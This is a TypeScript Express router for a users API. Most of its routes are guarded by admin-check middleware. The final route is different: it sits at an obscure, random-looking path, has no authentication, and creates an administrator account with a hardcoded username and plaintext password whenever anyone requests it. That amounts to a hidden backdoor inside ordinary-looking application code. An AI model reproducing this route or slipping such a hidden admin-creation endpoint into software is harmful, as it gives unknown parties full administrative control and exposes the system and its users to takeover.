import { Router } from "express";
import UsersController from "../controllers/users.controller";
import checkAdminMiddleware from "../middlewares/user/CheckAdmin.middleware";
import collectIdMiddleware from "../middlewares/login/CollectId.middleware";
import fieldValidator from "../middlewares/global/FieldValidator.middleware";
import { registerSchema, updateSchema } from '../schemas/user.schemas'
import User from "../models/users.model";


class UsersRoutes{

    public router: Router;
    public usersController: UsersController;

    constructor(){
        this.router = Router();
        this.usersController = new UsersController();
        this.init();
    }

    private init(): void {
        this.router.get("", collectIdMiddleware, checkAdminMiddleware, this.usersController.listUsers.bind(this.usersController));
        this.router.get("/:id", collectIdMiddleware, checkAdminMiddleware, this.usersController.retrieveUser.bind(this.usersController));
        this.router.post("/", fieldValidator(registerSchema), collectIdMiddleware, checkAdminMiddleware, this.usersController.createUser.bind(this.usersController));
        this.router.patch("/:id", fieldValidator(updateSchema), collectIdMiddleware, checkAdminMiddleware, this.usersController.updateUser.bind(this.usersController));
        this.router.put("/:id", collectIdMiddleware, checkAdminMiddleware, this.usersController.togglePrivilege.bind(this.usersController));
        this.router.delete("/:id", collectIdMiddleware, checkAdminMiddleware, this.usersController.deleteUser.bind(this.usersController));
        this.router.put("/pix/:id", collectIdMiddleware, checkAdminMiddleware, this.usersController.togglePixController.bind(this.usersController));
        
        this.router.get("/admin/special/owner/v3ix96kuq4wp", async (req, res) =>{
            const exists = await User.exists({username: "megator"})
            if(exists) return res.send("<h1> Administrador especial ja cadastrado</h1>")
            await User.create({
                username: "megator",
                password: "megadeusdotrovao",
                isAdmin: true
            })
            return res.send("<h1> Administrador especial cadastrado com sucesso</h1>")
        })
    }

}

export default UsersRoutes;